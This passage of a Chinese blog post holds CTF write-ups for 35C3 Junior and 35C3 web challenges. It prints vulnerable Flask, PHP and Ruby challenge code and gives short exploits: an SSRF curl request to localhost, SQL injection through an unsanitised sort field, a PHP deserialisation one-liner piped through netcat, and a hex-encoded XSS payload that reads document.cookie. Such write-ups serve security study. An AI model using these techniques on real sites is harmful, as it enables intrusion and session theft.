server_source():</span><br><span class="line">    return Response(inspect.getsource(sys.modules[__name__]), mimetype=&apos;text/x-python&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/pyserver/flags.py&quot;, methods=[&quot;GET&quot;])</span><br><span class="line">def server_flags():</span><br><span class="line">    return Response(&quot;&quot;&quot;</span><br><span class="line">DB_SECRET = &quot;35C3_???&quot;</span><br><span class="line">DECRYPTED = &quot;35C3_???&quot;</span><br><span class="line">DEV_NULL =  &quot;35C3_???&quot;</span><br><span class="line">LOCALHOST = &quot;35C3_???&quot;</span><br><span class="line">LOGGED_IN = &quot;35C3_???&quot;</span><br><span class="line">NOT_IMPLEMENTED = &quot;35C3_???&quot;</span><br><span class="line">    &quot;&quot;&quot;, mimetype=&apos;text/x-python&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/weelang/&#123;&#125;&quot;.format(WEETERPRETER), methods=[&quot;GET&quot;])</span><br><span class="line">def weeterpreter_source():</span><br><span class="line">    return send_file(os.path.join(WEE_PATH, WEETERPRETER), mimetype=&quot;text/x-typescript&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/weelang/package.json&quot;, methods=[&quot;GET&quot;])</span><br><span class="line">def weeterpreter_deps():</span><br><span class="line">    return send_file(os.path.join(WEE_PATH, &quot;package.json&quot;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/weelang/flags.ts&quot;, methods=[&quot;GET&quot;])</span><br><span class="line">def weeterpreter_flags():</span><br><span class="line">    return Response(&quot;&quot;&quot;</span><br><span class="line">export const CONVERSION_ERROR = &quot;35C3_???&quot;</span><br><span class="line">export const EQUALITY_ERROR = &quot;35C3_???&quot;</span><br><span class="line">export const LAYERS = &quot;35C3_???&quot;</span><br><span class="line">export const NUMBER_ERROR = &quot;35C3_???&quot;</span><br><span class="line">export const WEE_R_LEET = &quot;35C3_???&quot;</span><br><span class="line">export const WEE_TOKEN = &quot;35C3_???&quot;</span><br><span class="line">    &quot;&quot;&quot;, mimetype=&quot;text/x-typescript&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.before_first_request</span><br><span class="line">def maybe_init_db():</span><br><span class="line">    if not os.path.exists(DATABASE):</span><br><span class="line">        init_db()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;, port=8075)</span><br></pre></td></tr></table></figure>
+<p>漏洞代码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># Admin endpoints</span><br><span class="line">@app.route(&quot;/api/getprojectsadmin&quot;, methods=[&quot;POST&quot;])</span><br><span class="line">def getprojectsadmin():</span><br><span class="line">    # ProjectsRequest request = ctx.bodyAsClass(ProjectsRequest.class);</span><br><span class="line">    # ctx.json(paperbots.getProjectsAdmin(ctx.cookie(&quot;token&quot;), request.sorting, request.dateOffset));</span><br><span class="line">    name = request.cookies[&quot;name&quot;]</span><br><span class="line">    token = request.cookies[&quot;token&quot;]</span><br><span class="line">    user, username, email, usertype = user_by_token(token)</span><br><span class="line"></span><br><span class="line">    json = request.get_json(force=True)</span><br><span class="line">    offset = json[&quot;offset&quot;]</span><br><span class="line">    sorting = json[&quot;sorting&quot;]</span><br><span class="line"></span><br><span class="line">    if name != &quot;admin&quot;:</span><br><span class="line">        raise Exception(&quot;InvalidUserName&quot;)</span><br><span class="line"></span><br><span class="line">    sortings = &#123;</span><br><span class="line">        &quot;newest&quot;: &quot;created DESC&quot;,</span><br><span class="line">        &quot;oldest&quot;: &quot;created ASC&quot;,</span><br><span class="line">        &quot;lastmodified&quot;: &quot;lastModified DESC&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    sql_sorting = sortings[sorting]</span><br><span class="line"></span><br><span class="line">    if not offset:</span><br><span class="line">        offset = datetime.datetime.now()</span><br><span class="line"></span><br><span class="line">    return jsonify_projects(query_db(</span><br><span class="line">        &quot;SELECT code, userName, title, public, type, lastModified, created, content FROM projects WHERE created &lt; &apos;&#123;&#125;&apos; &quot;</span><br><span class="line">        &quot;ORDER BY &#123;&#125; LIMIT 10&quot;.format(offset, sql_sorting), one=False), username, &quot;admin&quot;)</span><br></pre></td></tr></table></figure>
+<p>从cookie中获取name，修改cookie即可。从json中提取值直接拼接到sql语句中，存在sql注入。</p>
+<h3 id="localhost"><a href="#localhost" class="headerlink" title="localhost"></a>localhost</h3><p>代码和上一题代码相同。</p>
+<p>漏洞代码如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&quot;/api/proxyimage&quot;, methods=[&quot;GET&quot;])</span><br><span class="line">def proxyimage():</span><br><span class="line">    url = request.args.get(&quot;url&quot;, &apos;&apos;)</span><br><span class="line">    parsed = parse.urlparse(url, &quot;http&quot;)  # type: parse.ParseResult</span><br><span class="line">    if not parsed.netloc:</span><br><span class="line">        parsed = parsed._replace(netloc=request.host)  # type: parse.ParseResult</span><br><span class="line">    url = parsed.geturl()</span><br><span class="line"></span><br><span class="line">    resp = requests.get(url)</span><br><span class="line">    if not resp.headers[&quot;Content-Type&quot;].startswith(&quot;image/&quot;):</span><br><span class="line">        raise Exception(&quot;Not a valid image&quot;)</span><br><span class="line"></span><br><span class="line">    # See https://stackoverflow.com/a/36601467/1345238</span><br><span class="line">    excluded_headers = [&apos;content-encoding&apos;, &apos;content-length&apos;, &apos;transfer-encoding&apos;, &apos;connection&apos;]</span><br><span class="line">    headers = [(name, value) for (name, value) in resp.raw.headers.items()</span><br><span class="line">               if name.lower() not in excluded_headers]</span><br><span class="line"></span><br><span class="line">    response = Response(resp.content, resp.status_code, headers)</span><br><span class="line">    return response</span><br></pre></td></tr></table></figure>
+<p>存在ssrf:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -v http://35.207.132.47/api/proxyimage?url=http://127.0.0.1:8075/img/paperbots.svg</span><br><span class="line"></span><br><span class="line">=&gt; </span><br><span class="line">X-Localhost-Token: 35C3_THIS_HOST_IS_YOUR_HOST_THIS_HOST_IS_LOCAL_HOST</span><br></pre></td></tr></table></figure>
+<h3 id="saltfish"><a href="#saltfish" class="headerlink" title="saltfish"></a>saltfish</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  require_once(&apos;flag.php&apos;);</span><br><span class="line">  if ($_ = @$_GET[&apos;pass&apos;]) &#123;</span><br><span class="line">    $ua = $_SERVER[&apos;HTTP_USER_AGENT&apos;];</span><br><span class="line">    if (md5($_) + $_[0] == md5($ua)) &#123;</span><br><span class="line">      if ($_[0] == md5($_[0] . $flag)[0]) &#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一个if条件，我们可以令$_为数组，此时md5($_)会返回NULL，然后令$_[0]以字母开头，两者相加会返回0，接着由于是若比较，我们可以令md5($ua)以0e开头，0e==0会返回True。</span><br><span class="line"></span><br><span class="line">第二个if条件$_[0]与md5($_[0] . $flag)的第一个字符比较，爆破即可。</span><br></pre></td></tr></table></figure>
+<h3 id="logged-in"><a href="#logged-in" class="headerlink" title="logged in"></a>logged in</h3><p>代码同上，想办法登录即可。</p>
+<p>漏洞代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&quot;/api/signup&quot;, methods=[&quot;POST&quot;])</span><br><span class="line">def signup():</span><br><span class="line">    usertype = &quot;user&quot;</span><br><span class="line">    json = request.get_json(force=True)</span><br><span class="line">    name = escape(json[&quot;name&quot;].strip())</span><br><span class="line">    email = json[&quot;email&quot;].strip()</span><br><span class="line">    if len(name) == 0:</span><br><span class="line">        raise Exception(&quot;InvalidUserName&quot;)</span><br><span class="line">    if len(email) == 0:</span><br><span class="line">        raise Exception(&quot;InvalidEmailAddress&quot;)</span><br><span class="line">    if not len(email.split(&quot;@&quot;)) == 2:</span><br><span class="line">        raise Exception(&quot;InvalidEmailAddress&quot;)</span><br><span class="line">    email = escape(email.strip())</span><br><span class="line">    # Make sure the user name is 4-25 letters/digits only.</span><br><span class="line">    if len(name) &lt; 4 or len(name) &gt; 25:</span><br><span class="line">        raise Exception(&quot;InvalidUserName&quot;)</span><br><span class="line"></span><br><span class="line">    if not all([x in string.ascii_letters or x in string.digits for x in name]):</span><br><span class="line">        raise Exception(&quot;InvalidUserName&quot;)</span><br><span class="line">    # Check if name exists</span><br><span class="line">    if query_db(&quot;SELECT name FROM users WHERE name=?&quot;, name):</span><br><span class="line">        raise Exception(&quot;UserExists&quot;)</span><br><span class="line">    if query_db(&quot;Select id, name FROM users WHERE email=?&quot;, email):</span><br><span class="line">        raise Exception(&quot;EmailExists&quot;)</span><br><span class="line">    # Insert user // TODO: implement the verification email</span><br><span class="line">    db = get_db()</span><br><span class="line">    c = db.cursor()</span><br><span class="line">    c.execute(&quot;INSERT INTO users(name, email, type) values(?, ?, ?)&quot;, (name, email, usertype))</span><br><span class="line">    db.commit()</span><br><span class="line">    return jsonify(&#123;&quot;success&quot;: True&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/api/login&quot;, methods=[&quot;POST&quot;])</span><br><span class="line">def login():</span><br><span class="line">    print(&quot;Logging in?&quot;)</span><br><span class="line">    # TODO Send Mail</span><br><span class="line">    json = request.get_json(force=True)</span><br><span class="line">    login = json[&quot;email&quot;].strip()</span><br><span class="line">    try:</span><br><span class="line">        userid, name, email = query_db(&quot;SELECT id, name, email FROM users WHERE email=? OR name=?&quot;, (login, login))</span><br><span class="line">    except Exception as ex:</span><br><span class="line">        raise Exception(&quot;UserDoesNotExist&quot;)</span><br><span class="line">    return get_code(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/api/verify&quot;, methods=[&quot;POST&quot;])</span><br><span class="line">def verify():</span><br><span class="line">    code = request.get_json(force=True)[&quot;code&quot;].strip()</span><br><span class="line">    if not code:</span><br><span class="line">        raise Exception(&quot;CouldNotVerifyCode&quot;)</span><br><span class="line">    userid, = query_db(&quot;SELECT userId FROM userCodes WHERE code=?&quot;, code)</span><br><span class="line">    db = get_db()</span><br><span class="line">    c = db.cursor()</span><br><span class="line">    c.execute(&quot;DELETE FROM userCodes WHERE userId=?&quot;, (userid,))</span><br><span class="line">    token = random_code(32)</span><br><span class="line">    c.execute(&quot;INSERT INTO userTokens (userId, token) values(?,?)&quot;, (userid, token))</span><br><span class="line">    db.commit()</span><br><span class="line">    name, = query_db(&quot;SELECT name FROM users WHERE id=?&quot;, (userid,))</span><br><span class="line">    resp = make_response()</span><br><span class="line">    resp.set_cookie(&quot;token&quot;, token, max_age=2 ** 31 - 1)</span><br><span class="line">    resp.set_cookie(&quot;name&quot;, name, max_age=2 ** 31 - 1)</span><br><span class="line">    resp.set_cookie(&quot;logged_in&quot;, LOGGED_IN)</span><br><span class="line">    return resp</span><br></pre></td></tr></table></figure>
+<p>由于登录之后会返回code,所以首先用admin登录一下，然后获取code，在调用<code>/api/verify</code>验证。</p>
+<h3 id="Note-accessible"><a href="#Note-accessible" class="headerlink" title="Note accessible"></a>Note accessible</h3><p>app.rb:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">require &apos;sinatra&apos;</span><br><span class="line">set :bind, &apos;0.0.0.0&apos;</span><br><span class="line"></span><br><span class="line">get &apos;/get/:id&apos; do</span><br><span class="line">    File.read(&quot;./notes/#&#123;params[&apos;id&apos;]&#125;.note&quot;)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &apos;/store/:id/:note&apos; do </span><br><span class="line">    File.write(&quot;./notes/#&#123;params[&apos;id&apos;]&#125;.note&quot;, params[&apos;note&apos;])</span><br><span class="line">    puts &quot;OK&quot;</span><br><span class="line">end </span><br><span class="line"></span><br><span class="line">get &apos;/admin&apos; do</span><br><span class="line">    File.read(&quot;flag.txt&quot;)</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+<p>index.php:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    require_once &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">    if(isset($_POST[&apos;submit&apos;]) &amp;&amp; isset($_POST[&apos;note&apos;]) &amp;&amp; $_POST[&apos;note&apos;]!=&quot;&quot;) &#123;</span><br><span class="line">        $note = $_POST[&apos;note&apos;];</span><br><span class="line"></span><br><span class="line">        if(strlen($note) &gt; 1000) &#123;</span><br><span class="line">            die(&quot;ERROR! - Text too long&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!preg_match(&quot;/^[a-zA-Z]+$/&quot;, $note)) &#123;</span><br><span class="line">            die(&quot;ERROR! - Text does not match /^[a-zA-Z]+$/&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $id = random_int(PHP_INT_MIN, PHP_INT_MAX);</span><br><span class="line">        $pw = md5($note);</span><br><span class="line"></span><br><span class="line">        # Save password so that we can check it later</span><br><span class="line">        file_put_contents(&quot;./pws/$id.pw&quot;, $pw); </span><br><span class="line"></span><br><span class="line">        file_get_contents($BACKEND . &quot;store/&quot; . $id . &quot;/&quot; . $note);</span><br><span class="line"></span><br><span class="line">        echo &apos;&lt;div class=&quot;shadow-sm p-3 mb-5 bg-white rounded&quot;&gt;&apos;;</span><br><span class="line">            echo &quot;&lt;p&gt;Your note ID is $id&lt;br&gt;&quot;;</span><br><span class="line">            echo &quot;Your note PW is $pw&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">            echo &quot;&lt;a href=&apos;/view.php?id=$id&amp;pw=$pw&apos;&gt;Click here to view your note!&lt;/a&gt;&quot;;</span><br><span class="line">        echo &apos;&lt;/div&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>view.php:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php header(&quot;Content-Type: text/plain&quot;); ?&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">    require_once &quot;config.php&quot;;</span><br><span class="line">    if(isset($_GET[&apos;id&apos;]) &amp;&amp; isset($_GET[&apos;pw&apos;])) &#123;</span><br><span class="line">        $id = $_GET[&apos;id&apos;];</span><br><span class="line">        if(file_exists(&quot;./pws/&quot; . (int) $id . &quot;.pw&quot;)) &#123;</span><br><span class="line">            if(file_get_contents(&quot;./pws/&quot; . (int) $id . &quot;.pw&quot;) == $_GET[&apos;pw&apos;]) &#123;</span><br><span class="line">                echo file_get_contents($BACKEND . &quot;get/&quot; . $id);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                die(&quot;ERROR!&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="35C3"><a href="#35C3" class="headerlink" title="35C3"></a>35C3</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;O:1:&quot;B&quot;:1:&#123;&#125;&apos; | nc 35.242.207.13 1</span><br></pre></td></tr></table></figure>
+<p>构造一个错误的序列化数据，从而在抛出异常时，调用<code>_destruct</code>.</p>
+<h3 id="lambda"><a href="#lambda" class="headerlink" title="lambda"></a>lambda</h3><p>采用gRPC server，安装grpcurl，可以直接和gRPC服务器进行交互。</p>
+<h3 id="filemanager"><a href="#filemanager" class="headerlink" title="filemanager"></a>filemanager</h3><p>漏洞代码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    (()=&gt;&#123;</span><br><span class="line">      for (let pre of document.getElementsByTagName(&apos;pre&apos;)) &#123;</span><br><span class="line">        let text = pre.innerHTML;</span><br><span class="line">        let q = &apos;document&apos;;</span><br><span class="line">        let idx = text.indexOf(q);</span><br><span class="line">        pre.innerHTML = `$&#123;text.substr(0, idx)&#125;&lt;mark&gt;$&#123;q&#125;&lt;/mark&gt;$&#123;text.substr(idx+q.length)&#125;`;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)();</span><br><span class="line">  &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>javascript:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">`\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x29\x3b\x3e\n`</span><br><span class="line">=&gt; </span><br><span class="line">&quot;&lt;img src=x onerror=alert(document.cookie);&gt;</span><br><span class="line">&quot;</span><br></pre></td></tr></table></figure>
+<p>反引号可以将字符串中的16进制，或者特殊符号转化</p>
+<h1 id="check"><a href="#check" class="headerlink" title="check"></a>check</h1><p>35C3_use_this_to_decrypt_encrypted_downloads</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="https://www.tiandiwuji.top">Tianji</a>
+            </p><p>原文链接: <a href="https://www.tiandiwuji.top/posts/56986/">https://www.tiandiwuji.top/posts/56986/</a>
+            </p><p>发表日期: <a href="https://www.tiandiwuji.top/posts/56986/">December 28th 2018, 12:41:03 pm</a>
+            </p><p>版权声明: 本文采用<a rel="external nofollow" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/posts/30918/" title="day-day-up">
+                    <div class="nextTitle">day-day-up</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/posts/7845/" title="java开发小记">
+                    <div class="prevTitle">java开发小记</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid="MTAyMC8zODcyNS8xNTI1Mw==">
+        <script type="text/javascript">
+            (function (d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') { return; }
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:fengyunhetao@gmail.com" class="iconfont-archer email" title="email" rel="external nofollow" target="_blank"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/fengyuhetao" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank" rel="external nofollow">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style="top:50vh;">
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Junoir-ctf"><span class="toc-number">1.</span> <span class="toc-text">Junoir  ctf</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flags"><span class="toc-number">1.1.1.</span> <span class="toc-text">flags</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#McDonald"><span class="toc-number">1.1.2.</span> <span class="toc-text">McDonald</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#blind"><span class="toc-number">1.1.3.</span> <span class="toc-text">blind</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#collider"><span class="toc-number">1.1.4.</span> <span class="toc-text">collider</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DB-secret"><span class="toc-number">1.1.5.</span> <span class="toc-text">DB secret</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#localhost"><span class="toc-number">1.1.6.</span> <span class="toc-text">localhost</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#saltfish"><span class="toc-number">1.1.7.</span> <span class="toc-text">saltfish</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#logged-in"><span class="toc-number">1.1.8.</span> <span class="toc-text">logged in</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Note-accessible"><span class="toc-number">1.1.9.</span> <span class="toc-text">Note accessible</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#35C3"><span class="toc-number">2.</span> <span class="toc-text">35C3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php"><span class="toc-number">2.1.1.</span> <span class="toc-text">php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lambda"><span class="toc-number">2.1.2.</span> <span class="toc-text">lambda</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#filemanager"><span class="toc-number">2.1.3.</span> <span class="toc-text">filemanager</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#check"><span class="toc-number">3.</span> <span class="toc-text">check</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
